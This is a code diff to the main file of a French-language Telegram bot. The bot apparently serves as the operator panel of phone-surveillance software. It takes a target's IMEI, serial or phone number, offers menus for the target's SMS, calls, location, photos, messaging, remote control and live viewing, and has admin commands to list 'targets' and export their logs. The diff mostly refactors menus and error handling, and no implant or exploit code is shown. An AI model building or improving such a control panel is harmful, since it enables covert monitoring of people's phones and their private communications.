@@ -1,6 +1,7 @@
-# main.py
+# main.py (version corrigée)
 import os
 import logging
+from datetime import datetime
 from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
     ApplicationBuilder,
@@ -28,8 +29,28 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Claviers réutilisables
+def get_main_category_keyboard():
+    return [
+        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
+        ["🖼️ Photos", "💬 Messageries", "🎙️ Contrôle à distance"],
+        ["📺 Visualisation directe", "📁 Fichiers", "⏱ Restrictions"],
+        ["📱 Applications", "🌐 Sites web", "📅 Calendrier"],
+        ["👤 Contacts", "📊 Analyse", "📋 Retour"]
+    ]
+
+def get_admin_keyboard():
+    return [
+        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
+        ["📈 Statistiques", "📤 Exporter les logs"],
+        ["⬅️ Retour au menu principal"]
+    ]
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Démarre la conversation et demande l'identifiant de l'appareil"""
+    # Réinitialiser les données utilisateur
+    context.user_data.clear()
+    
     await update.message.reply_text(
         "🔍 Entrez un IMEI, numéro de série (SN) ou numéro de téléphone (format international) pour commencer.",
         reply_markup=ReplyKeyboardRemove()
@@ -47,13 +68,7 @@ async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['current_device'] = user_input
         
         # Menu interactif avec les catégories
-        keyboard = [
-            ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
-            ["🖼️ Photos", "💬 Messageries", "🎙️ Contrôle à distance"],
-            ["📺 Visualisation directe", "📁 Fichiers", "⏱ Restrictions"],
-            ["📱 Applications", "🌐 Sites web", "📅 Calendrier"],
-            ["👤 Contacts", "📊 Analyse", "📋 Retour"]
-        ]
+        keyboard = get_main_category_keyboard()
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
         
         await update.message.reply_text(
@@ -71,6 +86,21 @@ async def handle_category_selection(update: Update, context: ContextTypes.DEFAUL
     """Gère la sélection de catégorie dans le menu interactif"""
     category = update.message.text
     device_id = context.user_data.get('current_device')
+    
+    # Gestion des commandes admin
+    if category == "📋 Liste des cibles":
+        return await list_targets(update, context)
+    elif category == "🗑️ Supprimer une cible":
+        await update.message.reply_text("Entrez /delete_target suivi de l'ID de la cible à supprimer")
+        return CATEGORY_SELECTION
+    elif category == "📈 Statistiques":
+        await update.message.reply_text("Entrez /stats_target suivi de l'ID de la cible")
+        return CATEGORY_SELECTION
+    elif category == "📤 Exporter les logs":
+        await update.message.reply_text("Entrez /export suivi de l'ID de la cible et du format (csv ou pdf)")
+        return CATEGORY_SELECTION
+    elif category == "⬅️ Retour au menu principal":
+        return await start(update, context)
     
     # Mappage des catégories aux sous-dossiers
     category_map = {
@@ -127,7 +157,13 @@ async def handle_category_selection(update: Update, context: ContextTypes.DEFAUL
         
         return FILE_OPERATION
     
-    await update.message.reply_text("❌ Catégorie non reconnue. Veuillez réessayer.")
+    # Si aucune catégorie valide n'est sélectionnée
+    keyboard = get_main_category_keyboard()
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(
+        "❌ Catégorie non reconnue. Veuillez réessayer.",
+        reply_markup=reply_markup
+    )
     return CATEGORY_SELECTION
 
 async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -139,13 +175,7 @@ async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TY
     
     if user_choice == "⬅️ Retour aux catégories":
         # Revenir au menu des catégories
-        keyboard = [
-            ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
-            ["🖼️ Photos", "💬 Messageries", "🎙️ Contrôle à distance"],
-            ["📺 Visualisation directe", "📁 Fichiers", "⏱ Restrictions"],
-            ["📱 Applications", "🌐 Sites web", "📅 Calendrier"],
-            ["👤 Contacts", "📊 Analyse", "📋 Retour"]
-        ]
+        keyboard = get_main_category_keyboard()
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
         await update.message.reply_text(
             f"Retour au menu des catégories pour {device_id}:",
@@ -173,6 +203,17 @@ async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TY
                 chat_id=update.effective_chat.id,
                 document=open(file_path, 'rb'),
                 filename=user_choice
+            )
+            
+            # Reafficher le menu des fichiers
+            files = file_manager.list_files(category_path)
+            file_keyboard = [[f] for f in files]
+            file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
+            reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
+            
+            await update.message.reply_text(
+                "Sélectionnez une autre action:",
+                reply_markup=reply_markup
             )
         else:
             await update.message.reply_text("❌ Fichier introuvable.")
@@ -220,11 +261,7 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Accès refusé.")
         return
     
-    keyboard = [
-        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
-        ["📈 Statistiques", "📤 Exporter les logs"],
-        ["⬅️ Retour au menu principal"]
-    ]
+    keyboard = get_admin_keyboard()
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     
     await update.message.reply_text(
@@ -243,6 +280,15 @@ async def list_targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
         response = "ℹ️ Aucune cible enregistrée."
     
     await update.message.reply_text(response)
+    
+    # Reafficher le menu admin
+    keyboard = get_admin_keyboard()
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(
+        "Sélectionnez une autre option:",
+        reply_markup=reply_markup
+    )
+    return CATEGORY_SELECTION
 
 async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Supprime une cible spécifique"""
@@ -261,6 +307,15 @@ async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ Cible {target_id} supprimée.")
     else:
         await update.message.reply_text(f"❌ Erreur lors de la suppression de {target_id}.")
+    
+    # Reafficher le menu admin
+    keyboard = get_admin_keyboard()
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(
+        "Sélectionnez une autre option:",
+        reply_markup=reply_markup
+    )
+    return CATEGORY_SELECTION
 
 async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Exporte les logs d'une cible spécifique"""
@@ -276,22 +331,36 @@ async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_id = context.args[0]
     format_type = context.args[1] if len(context.args) > 1 else "csv"
     
-    if format_type == "csv":
-        filename = report_generator.generate_csv(DB_NAME, target_id)
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=open(filename, 'rb'),
-            filename=f"{target_id}_logs.csv"
-        )
-    elif format_type == "pdf":
-        filename = report_generator.generate_pdf(DB_NAME, target_id)
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=open(filename, 'rb'),
-            filename=f"{target_id}_report.pdf"
-        )
-    else:
-        await update.message.reply_text("❌ Format non supporté. Utilisez 'csv' ou 'pdf'.")
+    try:
+        if format_type == "csv":
+            filename = report_generator.generate_csv(DB_NAME, target_id)
+            await context.bot.send_document(
+                chat_id=update.effective_chat.id,
+                document=open(filename, 'rb'),
+                filename=f"{target_id}_logs.csv"
+            )
+        elif format_type == "pdf":
+            filename = report_generator.generate_pdf(DB_NAME, target_id)
+            await context.bot.send_document(
+                chat_id=update.effective_chat.id,
+                document=open(filename, 'rb'),
+                filename=f"{target_id}_report.pdf"
+            )
+        else:
+            await update.message.reply_text("❌ Format non supporté. Utilisez 'csv' ou 'pdf'.")
+            return
+    except Exception as e:
+        logger.error(f"Erreur lors de l'export: {str(e)}")
+        await update.message.reply_text("❌ Erreur lors de la génération du rapport.")
+    
+    # Reafficher le menu admin
+    keyboard = get_admin_keyboard()
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(
+        "Sélectionnez une autre option:",
+        reply_markup=reply_markup
+    )
+    return CATEGORY_SELECTION
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Annule la conversation"""
@@ -300,6 +369,15 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=ReplyKeyboardRemove()
     )
     return ConversationHandler.END
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    """Gère les erreurs"""
+    logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
+    
+    if update and isinstance(update, Update):
+        await update.message.reply_text(
+            "❌ Une erreur s'est produite. Veuillez réessayer ou contacter l'administrateur."
+        )
 
 def run_bot():
     """Démarre le bot"""
@@ -313,7 +391,7 @@ def run_bot():
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)
             ],
             CATEGORY_SELECTION: [
-                MessageHandler(filters.Regex(r'^(📋 Liste des cibles|🗑️ Supprimer une cible|📈 Statistiques|📤 Exporter les logs)$'), admin_command),
+                MessageHandler(filters.Regex(r'^(📋 Liste des cibles|🗑️ Supprimer une cible|📈 Statistiques|📤 Exporter les logs|⬅️ Retour au menu principal)$'), admin_command),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_category_selection)
             ],
             FILE_OPERATION: [
@@ -335,17 +413,8 @@ def run_bot():
     application.add_error_handler(error_handler)
     
     # Démarrer le bot
-    print("Bot démarré avec succès!")
+    logger.info("Bot démarré avec succès!")
     application.run_polling()
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    """Gère les erreurs"""
-    logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
-    
-    if update and isinstance(update, Update):
-        await update.message.reply_text(
-            "❌ Une erreur s'est produite. Veuillez réessayer ou contacter l'administrateur."
-        )
 
 if __name__ == '__main__':
     run_bot()
